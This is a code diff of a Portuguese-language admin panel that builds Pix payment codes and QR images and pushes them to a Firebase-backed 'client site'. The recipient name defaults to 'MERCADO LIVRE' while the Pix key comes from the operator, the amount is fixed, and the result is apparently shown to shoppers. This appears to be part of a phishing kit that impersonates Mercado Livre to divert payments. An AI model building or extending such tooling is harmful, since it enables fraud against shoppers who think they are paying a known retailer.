@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Painel Admin</title>
-  <script src="https://cdn.jsdelivr.net/npm/pix-br-code@1.0.1/dist/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; background: #0a0e14; color: #e0e0e0; font-size: 14px; min-height: 100vh; }
@@ -355,18 +355,23 @@
       `).join('');
     }
 
+    /* GERA PIX COM PAYLOAD MANUAL + QRCODE */
     async function gerarPixConfig() {
       const chave = document.getElementById('chavePixInput').value.trim();
       const nome = document.getElementById('nomeRecebedor').value.trim() || 'MERCADO LIVRE';
       const cidade = document.getElementById('cidadeRecebedor').value.trim() || 'SAO PAULO';
       if (!chave) { alert('Digite a chave Pix'); return; }
+
       const valor = 159.44;
+
       try {
-        const copiaECola = await Pix(chave, nome, cidade, valor.toFixed(2), 'PEDIDO' + Date.now());
-        const qrCode = await Pix(chave, nome, cidade, valor.toFixed(2), 'PEDIDO' + Date.now(), true);
+        const copiaECola = gerarPayloadPix(chave, nome, cidade, valor);
+        const qrCode = await QRCode.toDataURL(copiaECola, { width: 300, margin: 2 });
+
         document.getElementById('pixQrPreview').src = qrCode;
         document.getElementById('pixCopiaColaPreview').value = copiaECola;
         document.getElementById('pixPreview').style.display = 'block';
+
         await db.ref('pixConfig').update({
           chave: copiaECola,
           qrCode: qrCode,
@@ -375,10 +380,28 @@
           cidade: cidade,
           atualizadoEm: Date.now()
         });
+
         alert('✅ Pix gerado e enviado para o site do cliente!');
       } catch(e) {
         alert('❌ Erro ao gerar Pix: ' + e.message);
       }
+    }
+
+    function gerarPayloadPix(chave, nome, cidade, valor) {
+      const f = (id, val) => id + ('00' + val.length).slice(-2) + val;
+      const cleanStr = (s) => (s || '').normalize('NFD').replace(/[\u0300-\u036f]/g, '').toUpperCase();
+
+      let gui = f('00', 'br.gov.bcb.pix') + f('01', (chave || '').trim());
+      let raw = f('00', '01') + f('26', gui) + f('52', '0000') + f('53', '986');
+      if (valor) raw += f('54', parseFloat(valor).toFixed(2));
+      raw += f('58', 'BR') + f('59', cleanStr(nome).substring(0,25)) + f('60', cleanStr(cidade).substring(0,15)) + f('62', f('05', '***')) + '6304';
+
+      let crc = 0xFFFF;
+      for (let i = 0; i < raw.length; i++) {
+        crc ^= (raw.charCodeAt(i) << 8);
+        for (let j = 0; j < 8; j++) crc = (crc & 0x8000) ? ((crc << 1) ^ 0x1021) & 0xFFFF : (crc << 1) & 0xFFFF;
+      }
+      return raw + ('0000' + crc.toString(16).toUpperCase()).slice(-4);
     }
 
     function copiarPreview() {
